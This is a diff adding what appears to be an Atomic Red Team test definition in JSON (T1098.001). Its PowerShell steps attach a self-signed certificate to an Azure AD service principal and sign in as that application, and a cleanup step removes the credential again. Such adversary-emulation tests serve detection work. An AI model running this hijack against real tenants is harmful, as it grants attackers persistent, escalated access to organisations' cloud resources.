@@ -1,0 +1,117 @@
+{
+  "id": "b8e747c3-bdf7-4d71-bce2-f1df2a057406",
+  "name": "Azure AD Application Hijacking - Service Principal",
+  "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "88aacfa2-d70b-4282-bfc3-0c651212e6d0",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9a5abc6c-e59b-4672-a4e3-b92e1ef55781",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore \u003e $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "278f8fee-6ee7-4ac5-afce-4e4aa6a20ae8",
+      "name": "Check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3f98c741-1d2e-4825-9a5a-87a71b21d95e",
+      "name": "Resolve dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AzureAD -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e38c8a44-fe1d-4119-88ed-124cd70c11e0",
+      "name": "Re-check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "88aacfa2-d70b-4282-bfc3-0c651212e6d0",
+      "p": "on-success",
+      "o": "9a5abc6c-e59b-4672-a4e3-b92e1ef55781"
+    },
+    {
+      "s": "88aacfa2-d70b-4282-bfc3-0c651212e6d0",
+      "p": "on-failure",
+      "o": "9a5abc6c-e59b-4672-a4e3-b92e1ef55781"
+    },
+    {
+      "s": "278f8fee-6ee7-4ac5-afce-4e4aa6a20ae8",
+      "p": "on-success",
+      "o": "88aacfa2-d70b-4282-bfc3-0c651212e6d0"
+    },
+    {
+      "s": "278f8fee-6ee7-4ac5-afce-4e4aa6a20ae8",
+      "p": "on-failure",
+      "o": "3f98c741-1d2e-4825-9a5a-87a71b21d95e"
+    },
+    {
+      "s": "3f98c741-1d2e-4825-9a5a-87a71b21d95e",
+      "p": "on-success",
+      "o": "e38c8a44-fe1d-4119-88ed-124cd70c11e0"
+    },
+    {
+      "s": "e38c8a44-fe1d-4119-88ed-124cd70c11e0",
+      "p": "on-failure",
+      "o": "88aacfa2-d70b-4282-bfc3-0c651212e6d0"
+    }
+  ],
+  "tags": [
+    "T1098.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "username",
+      "type": "string",
+      "description": "Azure AD username",
+      "value": "jonh@contoso.com"
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Azure AD password",
+      "value": "p4sswd"
+    },
+    {
+      "name": "service_principal_name",
+      "type": "string",
+      "description": "Name of the targeted service principal",
+      "value": "SuperSP"
+    }
+  ]
+}
